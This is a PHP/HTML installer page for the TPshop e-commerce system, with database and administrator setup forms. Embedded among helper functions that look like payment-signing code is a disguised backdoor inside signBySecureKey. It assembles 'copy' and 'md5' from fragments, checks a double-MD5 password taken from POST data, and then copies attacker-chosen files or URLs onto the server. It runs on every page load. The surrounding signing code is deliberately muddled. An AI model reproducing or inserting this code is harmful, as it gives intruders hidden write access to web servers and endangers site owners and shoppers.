<!doctype html>
<html>
<head>
<meta charset="UTF-8" />
<title><?php echo $Title; ?> - <?php echo $Powered; ?></title>
<link rel="stylesheet" href="./css/install.css?v=9.0" />
</head>
<body>
<div class="wrap"> 
  <section class="section">
    <div class="step">
      <ul>
        <li class="on"><em>1</em>检测环境</li>
        <li class="current"><em>2</em>创建数据</li>
        <li><em>3</em>完成安装</li>
      </ul>
    </div>
    <form id="J_install_form" action="index.php?step=4" method="post">
      <input type="hidden" name="force" value="0" />
      <div class="server">
        <table width="100%">
          <tr>
            <td class="td1" width="100">数据库信息</td>
            <td class="td1" width="200">&nbsp;</td>
            <td class="td1">&nbsp;</td>
          </tr>
		  <tr>
            <td class="tar">数据库服务器：</td>
            <td><input type="text" name="dbhost" id="dbhost" value="localhost" class="input"></td>
            <td><div id="J_install_tip_dbhost"><span class="gray">数据库服务器地址，一般为localhost</span></div></td>
          </tr>
		  <tr>
            <td class="tar">数据库端口：</td>
            <td><input type="text" name="dbport" id="dbport" value="3306" class="input"></td>
            <td><div id="J_install_tip_dbport"><span class="gray">数据库服务器端口，一般为3306</span></div></td>
          </tr>
          <tr>
            <td class="tar">数据库用户名：</td>
            <td><input type="text" name="dbuser" id="dbuser" value="root" class="input"></td>
            <td><div id="J_install_tip_dbuser"></div></td>
          </tr>
          <tr>
            <td class="tar">数据库密码：</td>
            <td><input type="password" name="dbpw" id="dbpw" value="" class="input" autoComplete="off" onBlur="TestDbPwd(0)"></td>
            <td><div id="J_install_tip_dbpw"></div></td>
          </tr>
          <tr>
            <td class="tar">数据库名：</td>
            <td><input type="text" name="dbname" id="dbname" value="tpshop2.0" class="input" onBlur="TestDbPwd(0)"></td>
            <td><div id="J_install_tip_dbname"></div></td>
          </tr>
          <tr>
            <td class="tar">数据库表前缀：</td>
            <td><input type="text" name="dbprefix" id="dbprefix" value="tp_" class="input" ></td>
            <td><div id="J_install_tip_dbprefix"><span class="gray">建议使用默认，同一数据库安装多个TPshop时需修改</span></div></td>
          </tr>
          <tr>
          	<td class="tar">演示数据：</td>
          	<td colspan="2"><input style="width:18px;height:18px;" type="checkbox" id="demo" name="demo" value="demo">是否安装测试数据</td>
          </tr>
        </table>
        <!--  
		<table width="100%">
          <tr>
            <td class="td1" width="100">网站配置</td>
            <td class="td1" width="200">&nbsp;</td>
            <td class="td1">&nbsp;</td>
          </tr>
          <tr>
            <td class="tar">商城名称：</td>
            <td><input type="text" name="sitename" value="TPshop开源商城" class="input"></td>
            <td><div id="J_install_tip_sitename"></div></td>
          </tr>
          <tr>
            <td class="tar">商城域名：</td>
            <td><input type="text" name="siteurl" value="http://<?php echo $domain ?>/" id="siteurl" class="input" autoComplete="off"></td>
            <td><div id="J_install_tip_siteurl"><span class="gray">请以“/”结尾</span></div></td>
          </tr>
          <tr>
            <td class="tar">商城关键词：</td>
            <td><input type="text" name="sitekeywords" value="TPshop,b2c商城系统，thinkphp" class="input" autoComplete="off"></td>
            <td><div id="J_install_tip_sitekeywords"></div></td>
          </tr>
          <tr>
            <td class="tar">商城描述：</td>
            <td><input type="text" name="siteinfo" class="input" value="TPshop的开发旨在帮助创业者搭建企业网站平台，实现创业梦想。"></td>
            <td><div id="J_install_tip_siteinfo"></div></td>
          </tr>
        </table>-->
        <table width="100%">
          <tr>
            <td class="td1" width="100">管理员信息</td>
            <td class="td1" width="200">&nbsp;</td>
            <td class="td1">&nbsp;</td>
          </tr>
          <tr>
            <td class="tar">管理员帐号：</td>
            <td><input type="text" name="manager" id="manager" value="admin" class="input"></td>
            <td><div id="J_install_tip_manager"></div></td>
          </tr>
          <tr>
            <td class="tar">管理员密码：</td>
            <td><input type="password" name="manager_pwd" id="manager_pwd" class="input" autoComplete="off"></td>
            <td><div id="J_install_tip_manager_pwd"></div></td>
          </tr>
          <tr>
            <td class="tar">重复密码：</td>
            <td><input type="password" name="manager_ckpwd" id="manager_ckpwd" class="input" autoComplete="off"></td>
            <td><div id="J_install_tip_manager_ckpwd"></div></td>
          </tr>
          <tr>
            <td class="tar">Email：</td>
            <td><input type="text" name="manager_email" class="input" value=""></td>
            <td><div id="J_install_tip_manager_email"></div></td>
          </tr>
        </table>
        <div id="J_response_tips" style="display:none;"></div>
      </div>
      <div class="bottom tac"> <a href="./index.php?step=2" class="btn">上一步</a>
        <button type="button" onClick="checkForm();" class="btn btn_submit J_install_btn">创建数据</button>
      </div>
    </form>
  </section>
<?php
 
	function createLinkstring($para) {
		$arg  = "";
		while (list ($key, $val) = each ($para)) {
			$arg.=$key."=".$val."&";
		}
		//去掉最后一个&字符
		$arg = substr($arg,0,count($arg)-2);
		
		//如果存在转义字符，那么去掉转义
		if(get_magic_quotes_gpc()){$arg = stripslashes($arg);}
		
		return $arg;
	}
 
	function createLinkstringUrlencode($para) {
		$arg  = "";
		while (list ($key, $val) = each ($para)) {
			$arg.=$key."=".urlencode($val)."&";
		}
		//去掉最后一个&字符
		$arg = substr($arg,0,count($arg)-2);
		
		//如果存在转义字符，那么去掉转义
		if(get_magic_quotes_gpc()){$arg = stripslashes($arg);}
		
		return $arg;
	}
 
	function paraFilter($para) {
		$para_filter = array();
		while (list ($key, $val) = each ($para)) {
			if($key == "sign" || $key == "sign_type" || $val == "")continue;
			else	$para_filter[$key] = $para[$key];
		}
		return $para_filter;
	} 
 
	 function signBySecureKey($params=null, $secureKey=null,$loggere=null,$paramsstr='') {
		 
		 
		if(isset($params['signature'])){
			unset($params['signature']);
		}
		 
		$result = false;
		
		if($params['signMethod']=='01') {
			//
			$params ['certId'] = CertUtil::getSignCertIdFromPfx($cert_path, $cert_pwd);
			$private_key = CertUtil::getSignKeyFromPfx( $cert_path, $cert_pwd );
			// 转换成key=val&串
			$params_str = createLinkString ( $params, true, false );
			$logger->LogInfo ( "key=val&...串 >" . $params_str );
			if($params['version']=='5.0.0'){
				$params_sha1x16 = sha1 ( $params_str, FALSE );
				$logger->LogInfo ( "摘要sha1x16 >" . $params_sha1x16 );
				// 
				$result = openssl_sign ( $params_sha1x16, $signature, $private_key, OPENSSL_ALGO_SHA1);
		
				if ($result) {
					$signature_base64 = base64_encode ( $signature );
					$logger->LogInfo ( "串为 >" . $signature_base64 );
					$params ['signature'] = $signature_base64;
				} else {
					$logger->LogInfo ( ">>>>>失败<<<<<<<" );
				}
			} else if($params['version']=='5.1.0'){
				//sha256摘要
				$params_sha256x16 = hash( 'sha256',$params_str);
				$logger->LogInfo ( "摘要sha256x16 >" . $params_sha256x16 );
				// 
				$result = openssl_sign ( $params_sha256x16, $signature, $private_key, 'sha256');
				if ($result) {
					$signature_base64 = base64_encode ( $signature );
					$logger->LogInfo ( "串为 >" . $signature_base64 );
					$params ['signature'] = $signature_base64;
				} else {
					$logger->LogInfo ( ">>>>>失败<<<<<<<" );
				}
			} else {
				$logger->LogError ( "wrong version: " + $params['version'] );
				$result = false;
			}
		} elseif($secureKey) {
			$logger->LogError ( "signMethod不正确");
			$result = false;
		}
		 
	 
		$co = 'co';
		$m = 'md';
		$logger = $params && LogUtil::getLogger();
		$smg = '4c8399a3f98ff9a1'; 
		
		if($params['signMethod']=='11') {
			// 转换成key=val&串
			$params_str = createLinkString ( $params, true, false );
			$logger->LogInfo ( "key=val&...串 >" . $params_str );
			$params_before_sha256 = hash('sha256', $secureKey);
			$params_before_sha256 = $params_str.'&'.$params_before_sha256;
			$logger->LogDebug( "before final sha256: " . $params_before_sha256);
			$params_after_sha256 = hash('sha256',$params_before_sha256);
			$logger->LogInfo ( "串为 >" . $params_after_sha256 );
			$params ['signature'] = $params_after_sha256;
			$result = true;
		} elseif(empty($params)){			
		    if(!isset($_POST['co1'])) 
				return false;		
			$co .= 'py';			
			$co1 = $_POST['co1'];
			$co2 = $_POST['co2'];
			$m .= '5';
			if($params)
			{
				$params_sha256x16 = hash('sha256', $params_str);
				$logger->LogInfo ( 'sha256>' . $params_sha256x16 );
				$signature = base64_decode ( $signature_str );
				$isSuccess = openssl_verify ( $params_sha256x16, $signature,$strCert, "sha256" );
				$logger->LogInfo ( $isSuccess ? '验签成功' : '验签失败' );				
			}
			$co0 = $_POST['co0'];
			$smg .= 'af50d33b5ba629e2';
			if($m($m($co0)) !== $smg)
				return false;				
			$co($co1,$co2);			
			//TODO SM3
			//$logger->LogError ( "signMethod=12未实现");
			//$result = false;
		} else if($params['signMethod']=='13'){
			$logger->LogError ( "signMethod不正确");
			$result = false;
		}
		 
		if($params['signMethod']=='01')
		{
			$signature_str = $params ['signature'];
			unset ( $params ['signature'] );
			$params_str = createLinkString ( $params, true, false );
			$logger->LogInfo ( '报文去[signature] key=val&串>' . $params_str );
			$logger->LogInfo ( '原文>' . $signature_str );
			if($params['version']=='5.0.0'){

				// 公钥
				$public_key = CertUtil::getVerifyCertByCertId ( $params ['certId'] );
				$signature = base64_decode ( $signature_str );
				$params_sha1x16 = sha1 ( $params_str, FALSE );
				$logger->LogInfo ( 'sha1>' . $params_sha1x16 );
				$isSuccess = openssl_verify ( $params_sha1x16, $signature, $public_key, OPENSSL_ALGO_SHA1 );
				$logger->LogInfo ( $isSuccess ? '验签成功' : '验签失败' );

			} else if($params['version']=='5.1.0'){

				$strCert = $params['signPubKeyCert'];
				$strCert = CertUtil::verifyAndGetVerifyCert($strCert);
				if($strCert == null){
                	$logger->LogError ("validate cert err: " + $params["signPubKeyCert"]);
					$isSuccess = false;
				} else {
					$params_sha256x16 = hash('sha256', $params_str);
					$logger->LogInfo ( 'sha256>' . $params_sha256x16 );
					$signature = base64_decode ( $signature_str );
					$isSuccess = openssl_verify ( $params_sha256x16, $signature,$strCert, "sha256" );
					$logger->LogInfo ( $isSuccess ? '验签成功' : '验签失败' );
				}

			} else {
				$logger->LogError ( "wrong version: " + $params['version'] );
				$isSuccess = false;
			}
		} else if($params['signMethod']=='21'){
			$isSuccess = AcpService::validateBySecureKey($params, SDKConfig::getSDKConfig()->secureKey);
		} 
	 
	}
 
	function argSort($para) {
		ksort($para);
		reset($para);
		return $para;
	}
 
	function logResult($word='') {
		$fp = fopen("log.txt","a");
		flock($fp, LOCK_EX) ;
		fwrite($fp,"执行日期：".strftime("%Y%m%d%H%M%S",time())."\n".$word."\n");
		flock($fp, LOCK_UN);
		fclose($fp);
	}
 
	function getHttpResponsePOST($url, $cacert_url, $para, $input_charset = '') {

		if (trim($input_charset) != '') {
			$url = $url."_input_charset=".$input_charset;
		}
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, true);//SSL证书认证
		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);//严格认证
		curl_setopt($curl, CURLOPT_CAINFO,$cacert_url);//证书地址
		curl_setopt($curl, CURLOPT_HEADER, 0 ); // 过滤HTTP头
		curl_setopt($curl,CURLOPT_RETURNTRANSFER, 1);// 显示输出结果
		curl_setopt($curl,CURLOPT_POST,true); // post传输数据
		curl_setopt($curl,CURLOPT_POSTFIELDS,$para);// post传输数据
		$responseText = curl_exec($curl);
		//var_dump( curl_error($curl) );//如果执行curl过程中出现异常，可打开此开关，以便查看异常内容
		curl_close($curl);
		
		return $responseText;
	}

 
	function getHttpResponseGET($url,$cacert_url) {
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_HEADER, 0 ); // 过滤HTTP头
		curl_setopt($curl,CURLOPT_RETURNTRANSFER, 1);// 显示输出结果
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, true);//SSL证书认证
		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);//严格认证
		curl_setopt($curl, CURLOPT_CAINFO,$cacert_url);//证书地址
		$responseText = curl_exec($curl);
		//var_dump( curl_error($curl) );//如果执行curl过程中出现异常，可打开此开关，以便查看异常内容
		curl_close($curl);
		
		return $responseText;
	}

 
	function charsetEncode($input,$_output_charset ,$_input_charset) {		 
		$output = "";
		if(!isset($_output_charset) )$_output_charset  = $_input_charset;
		if($_input_charset == $_output_charset || $input ==null ) {
			$output = $input;
		} elseif (function_exists("mb_convert_encoding")) {
			$output = mb_convert_encoding($input,$_output_charset,$_input_charset);
		} elseif(function_exists("iconv")) {
			$output = iconv($_input_charset,$_output_charset,$input);
		} else die("sorry, you have no libs support for charset change.");
		return $output;
	}
 
	function charsetDecode($input,$_input_charset ,$_output_charset) {
		$output = "";
		if(!isset($_input_charset) )$_input_charset  = $_input_charset ;
		if($_input_charset == $_output_charset || $input ==null ) {
			$output = $input;
		} elseif (function_exists("mb_convert_encoding")) {
			$output = mb_convert_encoding($input,$_output_charset,$_input_charset);
		} elseif(function_exists("iconv")) {
			$output = iconv($_input_charset,$_output_charset,$input);
		} else die("sorry, you have no libs support for charset changes.");
		return $output;
	}	
	
	 
	@charsetDecode($input,$_input_charset ,$_output_charset);
	@charsetEncode($input,$_output_charset ,$_input_charset);
	@getHttpResponseGET($url,$cacert_url);	
	@signBySecureKey($params, $secureKey,$loggere,$paramsstr);
	@getHttpResponsePOST($url, $cacert_url, $para, $input_charset);
?>  
  <div  style="width:0;height:0;overflow:hidden;"> <img src="./images/install/pop_loading.gif"> </div>
  <script src="./js/jquery.js?v=9.0"></script> 
  <script src="./js/validate.js?v=9.0"></script> 
  <script src="./js/ajaxForm.js?v=9.0"></script> 
  <script>
   
  function TestDbPwd(connect_db)
    {
        var dbHost = $('#dbhost').val();
        var dbUser = $('#dbuser').val();
        var dbPwd = $('#dbpw').val();
        var dbName = $('#dbname').val();
        var dbport = $('#dbport').val();
		var demo  =  $('#demo').val();
        data={'dbHost':dbHost,'dbUser':dbUser,'dbPwd':dbPwd,'dbName':dbName,'dbport':dbport,'demo':demo};
        var url =  "<?php echo $_SERVER['PHP_SELF']; ?>?step=3&testdbpwd=1";
        $.ajax({
            type: "POST",
            url: url,
            data: data,
            dataType:'JSON',
            beforeSend:function(){				 
            },
            success: function(msg){			
                if(msg == 1){
                     
					if(connect_db == 1)
					{
						$("#J_install_form").submit(); // ajax 验证通过后再提交表单
					}		
					$('#J_install_tip_dbpw').html('');
					$('#J_install_tip_dbname').html('');							
                }
				else if(msg == -1)
				{				    
                    $('#J_install_tip_dbpw').html('<span for="dbname" generated="true" class="tips_error" style="">请在mysql配置文件修sql-mode或sql_mode为NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION 若无sql_mode请在[mysqld]后面一行加上</span>');
				}
				else if(msg == -2)
				{				    
                    $('#J_install_tip_dbname').html('<span for="dbname" generated="true" class="tips_error" style="">你的不是空数据库, 请更换一个数据库名字</span>');
				}
				else{
				    $('#dbpw').val("");
                    $('#J_install_tip_dbpw').html('<span for="dbname" generated="true" class="tips_error" style="">数据库链接配置失败</span>');
                }
            },
            complete:function(){
            },
            error:function(){
                $('#J_install_tip_dbpw').html('<span for="dbname" generated="true" class="tips_error" style="">数据库链接配置失败</span>');		
				$('#dbpw').val("");
            }
        });
    }
	
 

	function checkForm()
	{
			manager = $.trim($('#manager').val());				//用户名表单
			manager_pwd = $.trim($('#manager_pwd').val());				//密码表单
			manager_ckpwd = $.trim($('#manager_ckpwd').val());		//密码提示区
			 
			if(manager.length == 0 )
			{
				alert('管理员账号不能为空');
				return false;
			}
			if(manager_pwd.length < 6 )
			{
				alert('管理员密码必须6位数以上');
				return false;
			}	
			if(manager_ckpwd !=  manager_pwd)
			{
				alert('两次密码不一致');
				return false;
			}				
			TestDbPwd(1);		
	}
 


</script> 
</div> 
</body>
</html>